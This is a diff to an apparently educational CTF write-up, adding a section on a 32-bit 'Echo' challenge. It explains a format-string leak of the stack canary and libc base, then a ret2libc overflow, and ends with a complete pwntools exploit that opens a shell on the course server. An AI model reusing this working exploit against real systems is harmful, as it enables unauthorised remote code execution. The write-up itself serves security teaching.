@@ -230,7 +230,7 @@ $2 = (char (*)[100]) 0xffffd160
 So the offset is 0xffffd1c8 - 0xffffd160 + 4 = 108.
 And our exploit script will look like this:
 
-```py
+```python
 #!/bin/python3
 
 from pwn import *
@@ -269,3 +269,228 @@ flag{...}
 ```
 
 We get our flag!
+
+## Extra CTF - Echo
+
+In this challenge, we are given two files, a 32 bit ELF binary and a libc file.
+As usual, we start by running the checksec command:
+
+```sh
+$ checksec program
+[*] '/home/seed/ctfs/echo/program'
+    Arch:     i386-32-little
+    RELRO:    Full RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      PIE enabled
+```
+
+All binary protections are enabled! Also, we are told that the server is
+running on Ubuntu 22.04., so we assume that there will be ASLR enabled as well.
+This will be a though one! Let's start playing around with the binary.
+
+![ctfe1](ctfe1.png)
+
+It looks like it is a simple echo program that just echos our messages back to
+us until we decide to quit. We now put our attention in the part that says that
+our name must have a maximum of 20 chars, maybe this is not enforced and we
+have a buffer overflow?
+
+![ctfe2](ctfe2.png)
+
+![ctfe3](ctfe3.png)
+
+Indeed, using gdb to disassemble the main function, we see that only 20 bytes
+are alocated on the stack, but then the fgets function reads up to 64 bytes!
+This gives us plenty of margin for a buffer overflow. Next, since we know there
+is a canary, if we want to make use of the buffer overflow, we must leak it
+somehow. Since our output is printed back to us, maybe there is also a format
+string vulnerability?
+
+![ctfe4](ctfe4.png)
+
+Our suspicion is confirmed. We now have all the information needed to develop
+our exploitation plan: leak the canary using the format string vulnerability;
+since the stack is not executable, we will perform ret2libc, and for that we
+need to leak a libc address aswell in order to defeat PIE and ASLR (if there
+weren't both of this securities, we could more easily lookup all libc addresses
+we wanted before running the program); overwrite the main return address with
+the ROP chain system + exit + "/bin/sh", making sure to keep the canary intact
+(except for that first bit that is always 0, but we will get to that); restore
+the first bit of the canary, using the fact that fgets places a 0 a the end of
+our string. Let's start with leaking the canary:
+
+![ctfe5](ctfe5.png)
+
+After some trial and error and help of gdb, we find a format string that leaks
+the canary. Our exploit function will look like this:
+
+```python
+def leak_canary(p):
+    canary_leak = '%8$x'
+    p.recvuntil(b'Insert your name (max 20 chars): ')
+    p.sendline(str.encode(canary_leak))
+    canary_bytes = p.recvline()[-9:-1]
+    canary = bytearray(4) # First bit is always 0
+    canary[3] = int(canary_bytes[0:2], base=16)
+    canary[2] = int(canary_bytes[2:4], base=16)
+    canary[1] = int(canary_bytes[4:6], base=16)
+    return canary
+```
+
+Next we will try to leak the base address of libc, needed to
+calculate the addresses of the libc functions we want to perform. Using vmmap
+in gdb, we find the base address of libc for the current execution.
+
+![ctfe6](ctfe6.png)
+
+We also investigate the stack and find a payload that gets us an address
+belonging to libc address space.
+
+![ctfe7](ctfe7.png)
+
+Subtracting them we get the following offset:
+
+![ctfe8](ctfe8.png)
+
+This means that to get libc base address, we just use a format string to leak
+this random andress, and after subtracting the offset, we obtain the base! Here
+is the python code that does this for us:
+
+```python
+def leak_libc(p):
+    payload = '%11$x'
+    p.recvuntil(b'Insert your name (max 20 chars): ')
+    p.sendline(str.encode(payload))
+    libc_base = int(p.recvline()[:-1], base=16) - 0x21519
+    return libc_base
+```
+
+Now, we need to find the real addresses of system(), exit(), and the string
+"/bin/sh" we can use the provided libc to find their offsets, and then just
+need to sum them to the previously calculated base address.
+
+![ctfe9](ctfe9.png)
+
+Putting this in the script:
+
+```python
+libc_base = leak_libc(p)
+   system_offset = 0x48150
+   binsh_offset  = 0x1bd0f5
+   exit_offset = 0x3a440
+   libc_system = libc_base + system_offset
+   libc_binsh  = libc_base + binsh_offset
+   libc_exit   = libc_base + exit_offset
+```
+
+Next, we create an auxiliary function to overwrite the return address while
+preserving the 3 most significant bits of the canary:
+
+```python
+def overwrite_return(p, canary, new_value):
+    buffer = bytearray(0x41 for _ in range(20+8+4+12)) # Size + canary + ebp + ret
+    buffer[21:24] = canary[1:]
+    buffer[32:] = new_value
+    p.sendline(buffer)
+```
+
+Finnally, we just need to restore the first bit of the canary with 0. Since
+fgets puts a newline followed by 0 at the end of our input, we will provide 19
+random characters, so that the 20th becomes a newline, and the 21th, which is
+the first bit of the canary becomes 0, leaving the canary completely undamaged.
+
+```python
+p.sendline(b'AAAAAAAAAAAAAAAAAAA')
+```
+
+Here is our final script:
+
+```python
+from pwn import *
+
+def back_to_name(p):
+    p.recvuntil(b'Insert your message: ')
+    p.sendline(b'adsadasdasdas')
+    p.recvuntil(b'>')
+    p.sendline(b'e')
+
+def leak_canary(p):
+    canary_leak = '%8$x'
+    p.recvuntil(b'Insert your name (max 20 chars): ')
+    p.sendline(str.encode(canary_leak))
+    canary_bytes = p.recvline()[-9:-1]
+    canary = bytearray(4) # First bit is always 0
+    canary[3] = int(canary_bytes[0:2], base=16)
+    canary[2] = int(canary_bytes[2:4], base=16)
+    canary[1] = int(canary_bytes[4:6], base=16)
+    return canary
+
+def leak_libc(p):
+    payload = '%11$x'
+    p.recvuntil(b'Insert your name (max 20 chars): ')
+    p.sendline(str.encode(payload))
+    libc_base = int(p.recvline()[:-1], base=16) - 0x21519
+    return libc_base
+
+def overwrite_return(p, canary, new_value):
+    buffer = bytearray(0x41 for _ in range(20+8+4+12)) # Size + canary + ebp + ret
+    buffer[21:24] = canary[1:]
+    buffer[32:] = new_value
+    p.sendline(buffer)
+
+def call_return(p):
+    p.recvuntil(b'Insert your message: ')
+    p.sendline(b'adsadasdasdas')
+    p.recvuntil(b'>')
+    p.sendline(b'q')
+
+def main():
+    # p = process('./program')
+    p = remote('ctf-fsi.fe.up.pt', 4002)
+
+    p.recvuntil(b'>')
+    p.sendline(b'e')
+
+    # leak canary
+    canary = leak_canary(p)
+    back_to_name(p)
+    
+    # leak_libc
+    libc_base = leak_libc(p)
+    system_offset = 0x48150
+    binsh_offset  = 0x1bd0f5
+    exit_offset = 0x3a440
+    libc_system = libc_base + system_offset
+    libc_binsh  = libc_base + binsh_offset
+    libc_exit   = libc_base + exit_offset
+    system_bytes = libc_system.to_bytes(4, byteorder='little')
+    binsh_bytes = libc_binsh.to_bytes(4, byteorder='little')
+    exit_bytes = libc_exit.to_bytes(4, byteorder='little')
+    back_to_name(p)
+
+    # overwrite return address
+    overwrite_return(p, canary, system_bytes + exit_bytes + binsh_bytes)
+    back_to_name(p)
+
+    # clear 0 bit of canary
+    p.sendline(b'AAAAAAAAAAAAAAAAAAA')
+    
+    # return main to invoke shell
+    call_return(p)
+    
+    p.interactive()
+
+if __name__ == "__main__":
+    main()
+```
+
+And after running it, we get a shell on the server and obtain the flag!
+
+```sh
+$ python3 exploit2.py 
+[+] Opening connection to ctf-fsi.fe.up.pt on port 4002: Done
+[*] Switching to interactive mode
+$ cat flag.txt
+flag{74e82e4b906cd69e6487bcd54d50edb2}
+```
